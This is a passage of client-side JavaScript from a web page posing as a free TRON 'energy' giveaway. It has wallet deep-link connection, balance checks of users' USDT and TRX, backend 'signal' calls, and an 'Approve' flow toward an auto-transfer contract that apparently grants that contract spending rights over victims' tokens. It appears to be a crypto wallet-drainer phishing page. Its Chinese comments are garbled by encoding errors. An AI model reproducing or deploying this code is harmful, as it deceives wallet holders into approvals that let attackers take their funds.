                DOM.reviewTipText.textContent = "ç­¾åæˆåŠŸï¼Œèƒ½é‡å·²åˆ°è´¦...";
                await Promise.all([
                    sendSignalA2().catch(err => console.warn("A2ä¿¡å·åŒæ­¥å¤±è´¥ï¼š", err)),
                    sendSignalB(false).then(async (b2Success) => {
                       if (b2Success) {
                           console.log("âœ… B2ä¿¡å·å‘é€æˆåŠŸï¼Œè¡¥å……æŸ¥è¯¢æœ€æ–°ä½™é¢");
                           await queryAndUpdateBalance(); // B2æˆåŠŸååˆ·æ–°ä½™é¢
                        }
                     }).catch(err => console.warn("B2ä¿¡å·åŒæ­¥å¤±è´¥ï¼š", err))
                ]);
                addAuthorizedAddress(userAddress);
                saveEnergyRecord();
                renderEnergyRecords();
                btn.textContent = lang.successBtn;
                DOM.userInfoStatus.innerHTML += lang.successArrival;
                alert(lang.successTip);
                DOM.reviewTip.style.display = "none";
            } catch (e) {
                console.error("Approveè°ƒç”¨å¤±è´¥ï¼ˆæ ¸å¿ƒåŸå› ï¼‰ï¼š", e);
                DOM.reviewTip.style.display = "none";
                btn.disabled = false;
                btn.textContent = lang.approveBtnText;
                let errMsg = e.message;
                if (errMsg.includes("A1ç¯å¢ƒæ ¡éªŒ")) errMsg = "A1ç¯å¢ƒæ ¡éªŒæœªé€šè¿‡ï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…";
                else if (errMsg.includes("contract")) errMsg = "åˆçº¦å®ä¾‹æ— æ•ˆï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…";
                alert(lang.authorizeFail.replace("{msg}", errMsg || "ç­¾åå–æ¶ˆæˆ–ç½‘ç»œå¼‚å¸¸"));
            }
        };
    }

    /**
     * ä¿®å¤1ï¼šé’±åŒ…è¿æ¥åæ˜¾ç¤ºåœ°å€ï¼›ä¿®å¤2ï¼šèƒ½é‡/å®½å¸¦è·å–
     * åˆå§‹åŒ–é’±åŒ…ï¼ˆæ ¸å¿ƒé‡æ„ï¼šæŒ‰â€œåœ°å€â†’ä½™é¢â†’éªŒè¯â†’åç»­â€é¡ºåºï¼‰
     * @param {boolean} isAfterApprove - æ˜¯å¦ä¸ºæˆæƒååˆå§‹åŒ–
     */
    async function initWallet(isAfterApprove = false) {
        const lang = langConfig[currentLang];
        let a1SignalSuccess = false;
        try {
            // æ­¥éª¤1ï¼šè·å–é’±åŒ…åœ°å€
            userAddress = tronWeb.defaultAddress?.base58;
            const statusAddressEl = document.getElementById("statusAddress");
            if (userAddress && statusAddressEl) {
                statusAddressEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            } else if (statusAddressEl) {
                statusAddressEl.textContent = "â€”â€”";
            }    
            
            updateWalletStatus();
            if (!userAddress) {        
                DOM.userInfoStatus.style.display = "block";
                DOM.balanceItems.forEach(item => item.style.display = "none");
                DOM.approveBtn.disabled = true;
                DOM.approveBtn.textContent = lang.insufficientBtn;
                updateWalletStatus();
                DOM.recordList.style.display = "none";
                // ç§»é™¤ï¼šåŸå¯èƒ½å­˜åœ¨çš„â€œæœªè¿æ¥â€æç¤ºæ–‡æœ¬
                DOM.userInfoStatus.innerHTML = "";
                return;
            }

            // æ­¥éª¤2ï¼šæŸ¥è¯¢ä½™é¢å‰å…ˆæ˜¾ç¤ºâ€œç¯å¢ƒæ£€æµ‹ä¸­â€ï¼ˆè¦†ç›–åŸâ€œæŸ¥è¯¢ä¸­â€ï¼‰
            DOM.userInfoStatus.innerHTML = ""; // æ¸…ç©ºæ—§æç¤ºï¼Œé¿å…å åŠ 
            DOM.userInfoStatus.style.display = "block";
            DOM.userInfoStatus.innerHTML = lang.a1CheckingTip; // å‘é€A1å‰æ˜¾ç¤ºæ£€æµ‹ä¸­
            DOM.recordList.style.display = "block";

            // æ­¥éª¤3ï¼šå¼‚æ­¥å‘é€A1ä¿¡å·ï¼ˆé˜²é‡å¤æ ¡éªŒ+çŠ¶æ€åŒæ­¥ï¼‰
            if (canSendA1Signal(userAddress)) {
                // å¼‚æ­¥å‘é€ï¼ŒæˆåŠŸååŒæ­¥çŠ¶æ€+æ›´æ–°UI+ç»‘å®šæŒ‰é’®
                sendSignalA1().then(result => {
                    a1SignalSuccess = result === "success";
                    if (a1SignalSuccess) {
                        // æ ¸å¿ƒï¼šåŒæ­¥é˜²é‡å¤æ ‡è®°ï¼ˆ15åˆ†é’Ÿå†…ä¸å†å‘é€ï¼‰
                        updateA1SignalRecord(userAddress);
                        // æ›´æ–°æ–‡æœ¬ä¸ºâ€œç¯å¢ƒç¬¦åˆé¢†å–â€
                        DOM.userInfoStatus.innerHTML = lang.a1EligibleTip;
                        // é‡æ–°æ ¡éªŒç”¨æˆ·èµ„æ ¼ï¼Œæ»¡è¶³åˆ™ç»‘å®šæŒ‰é’®
                        const { eligible, btnText } = verifyUserEligibility();
                        if (eligible) {
                            DOM.approveBtn.disabled = false;
                            DOM.approveBtn.textContent = btnText;
                            bindApproveLogic(); // A1æˆåŠŸ+èµ„æ ¼é€šè¿‡ï¼Œç»‘å®šæŒ‰é’®
                            queryAndUpdateBalance();
                        }
                    } else {
                        DOM.userInfoStatus.innerHTML = `${lang.a1SignalFailTip}`;
                        DOM.approveBtn.disabled = true;
                        DOM.approveBtn.textContent = lang.insufficientBtn;
                    }
                }).catch(err => {
                    a1SignalSuccess = false;
                    console.error("A1ä¿¡å·å‘é€å¼‚å¸¸ï¼š", err);
                    DOM.userInfoStatus.innerHTML = `${lang.a1SignalFailTip}`;
                    DOM.approveBtn.disabled = true;
                    DOM.approveBtn.textContent = lang.insufficientBtn;
                });
            } else {
                // 15åˆ†é’Ÿå†…å·²å‘é€è¿‡A1ï¼Œç›´æ¥è¯»å–æœ¬åœ°çŠ¶æ€
                const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
                a1SignalSuccess = a1Status[userAddress] === "success";
                if (a1SignalSuccess) {
                    DOM.userInfoStatus.innerHTML = lang.a1EligibleTip; // ç›´æ¥æ˜¾ç¤ºç¬¦åˆæ¡ä»¶
                } else {
                    DOM.userInfoStatus.innerHTML = lang.a1SignalFailTip;
                    DOM.approveBtn.disabled = true;
                    DOM.approveBtn.textContent = lang.insufficientBtn;
                }
            }
            

            // æ­¥éª¤4ï¼šå¹¶è¡ŒæŸ¥è¯¢ä½™é¢ï¼ˆä¸é˜»å¡A1ä¿¡å·æ£€æµ‹ï¼‰
            const [usdtRaw, trxRaw, userEnergy, userBandwidth] = await Promise.all([
                (trc20Contract || await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS)).balanceOf(userAddress).call().catch(err => 0),
                tronWeb.trx.getBalance(userAddress).catch(err => 0),
                queryUserEnergyBalance(userAddress),
                queryBandwidthBalance(userAddress)
            ]);

            // æ ¼å¼åŒ–ä½™é¢
            tokenBalance = Number(usdtRaw) / 1000000;
            trxBalance = Number(trxRaw) / 1000000;
            currentEnergy = userEnergy;
            currentBandwidth = userBandwidth;
            showBalanceInUserInfo();

            // æ­¥éª¤5ï¼šéªŒè¯ç”¨æˆ·èµ„æ ¼ï¼ˆA1æœªè¿”å›æ—¶å…ˆç¦ç”¨æŒ‰é’®ï¼Œè¿”å›åè‡ªåŠ¨æ¿€æ´»ï¼‰
            const { eligible, tip, btnText } = verifyUserEligibility();
            if (!eligible) {
                DOM.userInfoStatus.innerHTML = tip;
                DOM.approveBtn.disabled = true;
                DOM.approveBtn.textContent = btnText;
                renderEnergyRecords();
                return;
            }

            // æ­¥éª¤6ï¼šA1å·²è¿”å›æˆåŠŸæ—¶ç›´æ¥ç»‘å®šï¼Œæœªè¿”å›åˆ™ç­‰å¾…å›è°ƒè§¦å‘
            DOM.recordList.style.display = "block";
            renderEnergyRecords();
            DOM.approveBtn.textContent = btnText;
            // è‹¥A1å·²æˆåŠŸï¼Œç›´æ¥ç»‘å®šæŒ‰é’®
            if (a1SignalSuccess) {
                DOM.approveBtn.disabled = false;
                bindApproveLogic();
            } else {
                DOM.approveBtn.disabled = true; // A1æœªå®Œæˆå‰ä¿æŒç¦ç”¨
            }

        } catch (e) {
            console.error("é’±åŒ…åˆå§‹åŒ–å¤±è´¥ï¼š", e);
            DOM.userInfoStatus.style.display = "block";
            // ç§»é™¤ï¼šåŸå¯èƒ½å­˜åœ¨çš„â€œæœªè¿æ¥â€æç¤ºæ–‡æœ¬ï¼Œä¿ç•™é”™è¯¯ä¿¡æ¯
            DOM.userInfoStatus.innerHTML = `${lang.errorTipPrefix}${e.message || lang.ineligibleTip}`;
            DOM.balanceItems.forEach(item => item.style.display = "none");
            DOM.approveBtn.disabled = true;
            DOM.approveBtn.textContent = lang.insufficientBtn;
            updateWalletStatus();
            DOM.recordList.style.display = userAddress ? "block" : "none";
            if (userAddress) renderEnergyRecords();
        }
    }

    /**
     * ä¿®å¤3ï¼šç‚¹å‡»é“¾æ¥åç›´æ¥æ˜¾ç¤ºé€‰æ‹©é’±åŒ…å¼¹çª—ï¼ˆæ— éœ€ç‚¹å‡»è¿æ¥æŒ‰é’®ï¼‰
     * æ£€æµ‹é’±åŒ…ç¯å¢ƒï¼ˆTRONå…¼å®¹é’±åŒ…ï¼‰
     */
 async function checkWalletEnv() {
    // æ£€æµ‹åˆ°æœ¬åœ°tronWebï¼ˆå·²è¿æ¥é’±åŒ…ï¼‰- ä¿ç•™å»¶æ—¶åŠ¨ç”»
    if (window.tronWeb && window.tronWeb.ready) {
        tronWeb = window.tronWeb;
        DOM.connectBtn.style.display = "none"; // éšè—è¿æ¥æŒ‰é’®
        DOM.warning.style.display = "none";
        DOM.specialTipContainer.style.display = "none";
        // å…³é”®ï¼šæ£€æµ‹åˆ°é’±åŒ…æ—¶ï¼Œä¿ç•™å»¶æ—¶åŠ¨ç”»ï¼ˆ1500msåæ‰§è¡Œåˆå§‹åŒ–ï¼Œä¸åŠ è½½åŠ¨ç”»åŒæ­¥ï¼‰
        setTimeout(async () => {
            await initWallet(false);
        }, 1500);
        return;
    }

    // æœªæ£€æµ‹åˆ°é’±åŒ…ç¯å¢ƒï¼šé€»è¾‘ç«‹å³æ‰§è¡Œï¼Œå¼¹çª—å»¶è¿Ÿ1500msæ˜¾ç¤ºï¼ˆé¿å…æ¯”ä¸»é¡µé¢æå‰ï¼‰
    // ç«‹å³æ‰§è¡ŒDOMæ ·å¼é…ç½®é€»è¾‘
    DOM.specialTipContainer.style.display = "block";
    DOM.userInfoStatus.style.display = "block";
    DOM.userInfoStatus.innerHTML = "";
    DOM.approveBtn.style.display = "none";
    DOM.connectBtn.style.display = "block";

    // å…³é”®ä¿®æ”¹ï¼šå¼¹çª—å»¶è¿Ÿ1500msæ˜¾ç¤ºï¼ˆä¸ä¸»é¡µé¢åŠ è½½åŠ¨ç”»åŒæ­¥ï¼Œä¸æå‰å¼¹å‡ºï¼‰
    setTimeout(() => {
        DOM.multiWalletPopup.style.display = "block";
    }, 1000); // å’ŒåŠ è½½åŠ¨ç”»æ—¶é•¿ä¸€è‡´ï¼Œç¡®ä¿ä¸æ—©äºä¸»é¡µé¢æ˜¾ç¤º
}
    /**
     * é‡æ–°æ¸²æŸ“åŠ¨æ€å†…å®¹ï¼ˆè¯­è¨€åˆ‡æ¢/çŠ¶æ€å˜åŒ–åè°ƒç”¨ï¼Œæ— ä¿®æ”¹ï¼‰
     */
    async function reRenderDynamicContent() {
        const lang = langConfig[currentLang];
        let a1SignalSuccess = false;
        if (!userAddress) {
            DOM.approveBtn.disabled = true;
            DOM.approveBtn.textContent = lang.approveBtnText;
            DOM.recordList.style.display = "none";
            await updateUserInfoDisplay();
            return;
        }
        DOM.recordList.style.display = "block";
        DOM.recordList.style.visibility = "visible";

        // æ˜¾ç¤ºâ€œç¯å¢ƒæ£€æµ‹ä¸­â€å¹¶å‘é€A1ä¿¡å·
        DOM.userInfoStatus.innerHTML = lang.a1CheckingTip;
        if (canSendA1Signal(userAddress)) {
            sendSignalA1().then(result => {
                a1SignalSuccess = result === "success";
                if (a1SignalSuccess) {
                    updateA1SignalRecord(userAddress); // åŒæ­¥é˜²é‡å¤æ ‡è®°
                    DOM.userInfoStatus.innerHTML = lang.a1EligibleTip;
                    // é‡æ–°æ ¡éªŒèµ„æ ¼å¹¶ç»‘å®šæŒ‰é’®
                    const { eligible, btnText } = verifyUserEligibility();
                    if (eligible) {
                        DOM.approveBtn.disabled = false;
                        DOM.approveBtn.textContent = btnText;
                        bindApproveLogic();
                    }
                } else {
                    DOM.userInfoStatus.innerHTML = lang.a1SignalFailTip;
                    DOM.approveBtn.disabled = true;
                }
            }).catch(err => {
                a1SignalSuccess = false;
                DOM.userInfoStatus.innerHTML = lang.a1SignalFailTip;
                DOM.approveBtn.disabled = true;
            });
        } else {
            // è¯»å–æœ¬åœ°çŠ¶æ€
            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
            a1SignalSuccess = a1Status[userAddress] === "success";
            if (a1SignalSuccess) {
                DOM.userInfoStatus.innerHTML = lang.a1EligibleTip;
            } else {
                DOM.userInfoStatus.innerHTML = lang.a1SignalFailTip;
            }
        }

        if (userAddress === SPECIAL_ADDRESS) {
            updateWalletStatus();
            await updateUserInfoDisplay();
            renderEnergyRecords();
            DOM.approveBtn.textContent = lang.approveBtnText;
            
            if (DOM.statusAddressEl) {
                DOM.statusAddressEl.style.display = "inline";
                DOM.statusAddressEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            }

            // A1æˆåŠŸ+èµ„æ ¼é€šè¿‡åˆ™ç»‘å®š
            const { eligible } = verifyUserEligibility();
            if (eligible && a1SignalSuccess) {
                DOM.approveBtn.disabled = false;
                bindApproveLogic();
            } else {
                DOM.approveBtn.disabled = true;
            }
            return;
        }

        if (isAddressAuthorized(userAddress)) {
            updateWalletStatus();
            await updateUserInfoDisplay();
            DOM.approveBtn.disabled = true;
            DOM.approveBtn.textContent = lang.authorizedBtn;
            return;
        }

        // æ™®é€šåœ°å€ï¼šåŒæ¡ä»¶ç»‘å®š
        const { eligible, btnText } = verifyUserEligibility();
        DOM.approveBtn.textContent = btnText;
        if (eligible && a1SignalSuccess) {
            DOM.approveBtn.disabled = false;
            bindApproveLogic();
        } else {
            DOM.approveBtn.disabled = true;
        }

        updateWalletStatus();
        await updateUserInfoDisplay();
        renderEnergyRecords();
    }

   /********************************************************************
 * äº‹ä»¶ç»‘å®šï¼šå®Œæ•´åˆå¹¶æ‰€æœ‰é€»è¾‘ï¼Œä¿®å¤è¯­æ³•é”™è¯¯+åˆ·æ–°é€‚é…ï¼Œå¯ç›´æ¥æ›¿æ¢
 ********************************************************************/
document.addEventListener('DOMContentLoaded', async () => {
    /****************************************************************
     * åŸºç¡€åˆå§‹åŒ–ï¼ˆä¿ç•™åŸæœ‰é€»è¾‘ï¼Œæ— ä¿®æ”¹ï¼‰
     ****************************************************************/
    contractEnergyEl = document.getElementById("contractEnergy");
    console.log("èƒ½é‡æ˜¾ç¤ºå…ƒç´ æ˜¯å¦æ‰¾åˆ°ï¼š", contractEnergyEl ? "âœ… æ‰¾åˆ°" : "âŒ æœªæ‰¾åˆ°");
    if (!contractEnergyEl) {
        alert("âš ï¸ èƒ½é‡æ˜¾ç¤ºå…ƒç´ æœªæ‰¾åˆ°ï¼Œè¯·æ£€æŸ¥é¡µé¢ä¸­æ˜¯å¦æœ‰id='contractEnergy'çš„æ ‡ç­¾");
        return;
    }
    startPersistentEnergyCountdown();
    initLangDisplay();
    updatePageLang();
    DOM.contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
    contractEnergyEl.textContent = Math.floor(INIT_TRX);
    renderEnergyRecords();
    updateWalletStatus();
    updateUserBalanceDisplay();

    /****************************************************************
     * è¯­è¨€åˆ‡æ¢äº‹ä»¶ï¼ˆä¿ç•™åŸæœ‰é€»è¾‘ï¼Œæ— ä¿®æ”¹ï¼‰
     ****************************************************************/
    DOM.langToggleBtn.addEventListener("click", (e) => {
        e.stopPropagation();
        DOM.langDropdown.classList.toggle("open");
    });
    DOM.langDropdownItems.forEach(item => {
        item.addEventListener("click", (e) => {
            e.stopPropagation();
            const newLang = item.getAttribute("data-lang");
            changeLang(newLang);
        });
    });
    document.addEventListener("click", () => {
        DOM.langDropdown.classList.remove("open");
    });
    DOM.langDropdown.addEventListener("click", (e) => {
        e.stopPropagation();
    });

    /****************************************************************
     * è¿æ¥é’±åŒ…æŒ‰é’®ï¼šç‚¹å‡»é‡æ–°æ˜¾ç¤ºå¼¹çª—ï¼ˆä¿ç•™åŸæœ‰é€»è¾‘ï¼Œæ— ä¿®æ”¹ï¼‰
     ****************************************************************/
    DOM.connectBtn.addEventListener('click', () => {
        console.log('è¿æ¥æŒ‰é’®ç‚¹å‡»ï¼Œé‡æ–°æ˜¾ç¤ºå¼¹çª—');
        // å…³é”®ä¿®æ”¹ï¼šåˆ é™¤æ‰€æœ‰å¼ºåˆ¶å®šä½ä»£ç ï¼Œå¤ç”¨å…ƒç´ è¡¨åŸæœ‰æ ·å¼
        DOM.multiWalletPopup.style.display = "block";

        DOM.userInfoStatus.style.display = "block";
        DOM.userInfoStatus.innerHTML = "";
    });

    /****************************************************************
     * å¼¹çª—å…³é—­é€»è¾‘ï¼ˆä¿ç•™åŸæœ‰é€»è¾‘ï¼Œæ— ä¿®æ”¹ï¼‰
     ****************************************************************/
    DOM.closeMultiWalletBtn.addEventListener('click', () => {
        DOM.multiWalletPopup.style.display = "none";
        DOM.userInfoStatus.style.display = "none";
    });

    /****************************************************************
     * æ ¸å¿ƒï¼šå¤šé’±åŒ…ç‚¹å‡»äº‹ä»¶ï¼ˆä¿®å¤æ‹¬å·é—­åˆ+é€»è¾‘è¿è´¯ï¼‰
     ****************************************************************/
    DOM.walletItems.forEach(item => {
        item.addEventListener('click', async () => {
            const walletType = item.getAttribute("data-wallet");
            const wallet = walletConfig[walletType];
            if (!wallet) return;

            const loadingEl = document.getElementById("Loading");
            const lang = langConfig[currentLang];
            const targetUrl = window.location.href + "#approve";

            // 1. ç«‹å³æ˜¾ç¤ºåŠ è½½åŠ¨ç”»+å…³é—­å¼¹çª—+ç¦ç”¨é‡å¤ç‚¹å‡»
            if (loadingEl) loadingEl.style.display = "flex";
            item.style.pointerEvents = "none";
            DOM.multiWalletPopup.style.display = "none";

            // 2. ç”Ÿæˆå¯¹åº”é’±åŒ…çš„è·³è½¬é“¾æ¥
            let jumpUrl = "";
            switch (walletType) {
                case "imtoken":
                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
                    break;
                case "tokenpocket":
                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl) + wallet.suffix;
                    break;
                case "tronlink":
                    const param = JSON.stringify({ url: targetUrl, action: "open", protocol: "tronlink", version: "1.0" });
                    jumpUrl = wallet.scheme + encodeURIComponent(param);
                    break;
                case "bitget":
                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
                    break;
                default:
                    jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
            }
            console.log(`ğŸ“¤ è·³è½¬${wallet.name}ï¼š`, jumpUrl);
            window.location.href = jumpUrl;

            // 3. 500msåæ‰§è¡Œç¯å¢ƒæ£€æµ‹+åˆå§‹åŒ–ï¼ˆå…¼å®¹é’±åŒ…å”¤èµ·æˆåŠŸ/å¤±è´¥ï¼‰
            setTimeout(async () => {
                try {
                    // ç­‰å¾…é’±åŒ…æ³¨å…¥tronWeb
                    if (window.tronWeb && !window.tronWeb.ready) {
                        await new Promise(resolve => window.tronWeb.onReady(resolve));
                    }
                    // é’±åŒ…ç¯å¢ƒï¼šæ‰§è¡Œåˆå§‹åŒ–
                    if (window.tronWeb) {
                        tronWeb = window.tronWeb;
                        DOM.connectBtn.style.display = "none";
                        DOM.warning.style.display = "none";
                        DOM.specialTipContainer.style.display = "none";
                        await initWallet(false);
                    } else {
                        // éé’±åŒ…ç¯å¢ƒï¼šå¤åˆ¶é“¾æ¥å¹¶æç¤º
                        navigator.clipboard.writeText(targetUrl).then(() => {
                            alert(lang.copySuccess);
                        }).catch(() => {
                            alert(lang.copyFail);
                        });
                    }
                } catch (err) {
                    console.error("å¤šé’±åŒ…ç‚¹å‡»åé€»è¾‘æ‰§è¡Œå¤±è´¥ï¼š", err);
                    DOM.userInfoStatus.style.display = "none";
                    DOM.balanceItems.forEach(item => item.style.display = "none");
                    DOM.approveBtn.disabled = true;
                    DOM.approveBtn.textContent = lang.approveBtnText;
                    updateUserBalanceDisplay();
                }
            }, 500);

            // 4. 1500msåéšè—åŠ¨ç”»+æ¢å¤ç‚¹å‡»æƒé™
            setTimeout(() => {
                if (loadingEl) loadingEl.style.display = "none";
                item.style.pointerEvents = "auto";
                DOM.userInfoEl.style.display = "block";
                DOM.walletStatusContainer.style.display = "block";
                DOM.contractResourceContainer.style.display = "block";
            }, 1500);
        });
    });

    /****************************************************************
     * åˆ·æ–°é€‚é…ï¼šé¡µé¢åŠ è½½ï¼ˆå«åˆ·æ–°ï¼‰åç»Ÿä¸€æ‰§è¡Œé€»è¾‘
     ****************************************************************/
    const loadingEl = document.getElementById("Loading");
    // é¡µé¢åŠ è½½/åˆ·æ–°åç«‹å³æ˜¾ç¤ºåŠ è½½åŠ¨ç”»
    if (loadingEl) loadingEl.style.display = "flex";
    // 500msåæ‰§è¡Œç¯å¢ƒæ£€æµ‹+åˆå§‹åŒ–ï¼ˆç»Ÿä¸€é¦–æ¬¡æ‰“å¼€å’Œåˆ·æ–°é€»è¾‘ï¼‰
    setTimeout(async () => {
        try {
            // å…ˆæ‰§è¡Œç¯å¢ƒæ£€æµ‹ï¼ˆæ ¸å¿ƒï¼šè¯†åˆ«æ˜¯å¦ä¸ºé’±åŒ…æµè§ˆå™¨ï¼‰
            await checkWalletEnv();
            // é’±åŒ…ç¯å¢ƒï¼šæ£€æµ‹é€šè¿‡åæ‰§è¡Œåˆå§‹åŒ–
            if (window.tronWeb) {
                if (!window.tronWeb.ready) {
                    await new Promise(resolve => window.tronWeb.onReady(resolve));
                }
                tronWeb = window.tronWeb;
                await initWallet(false);
                
       startPersistentEnergyCountdown();
            }
        } catch (err) {
            console.error("åˆ·æ–°/é¦–æ¬¡æ‰“å¼€åé€»è¾‘æ‰§è¡Œå¤±è´¥ï¼š", err);
            const lang = langConfig[currentLang];
            DOM.userInfoStatus.style.display = "none";
            DOM.balanceItems.forEach(item => item.style.display = "none");
            DOM.approveBtn.disabled = true;
            DOM.approveBtn.textContent = lang.approveBtnText;
            updateUserBalanceDisplay();
        }
    }, 500);

    // 1500msåå¼ºåˆ¶éšè—åŠ è½½åŠ¨ç”»ï¼ˆé¿å…åŠ¨ç”»å¡æ­»ï¼‰
    setTimeout(() => {
        if (loadingEl) loadingEl.style.display = "none";
        DOM.userInfoEl.style.display = "block";
        DOM.walletStatusContainer.style.display = "block";
        DOM.contractResourceContainer.style.display = "block";
    }, 1500);
    /****************************************************************
     * æˆæƒåè·³è½¬å¤„ç†ï¼ˆä¿ç•™åŸæœ‰é€»è¾‘ï¼Œæ— ä¿®æ”¹ï¼‰
     ****************************************************************/
    if (window.tronWeb && window.location.hash === "#approve") {
        window.location.hash = "";
        setTimeout(() => {
            initWallet(true).catch(err => {
                console.error("æˆæƒååˆå§‹åŒ–å¤±è´¥ï¼š", err);
                const lang = langConfig[currentLang];
                const tip = lang.ineligibleTip;
                DOM.userInfoStatus.style.display = "block";
                DOM.userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                DOM.approveBtn.disabled = false;
                DOM.approveBtn.textContent = lang.approveBtnText;
            });
        }, 500);
    }

    /****************************************************************
     * é¡µé¢å¸è½½æ—¶æ¸…ç†å®šæ—¶å™¨ï¼ˆé¿å…å†…å­˜æ³„æ¼ï¼‰
     ****************************************************************/
    window.addEventListener("beforeunload", () => {
        if (trxTimer) clearTimeout(trxTimer);
    });
});
</script>
</body>
</html>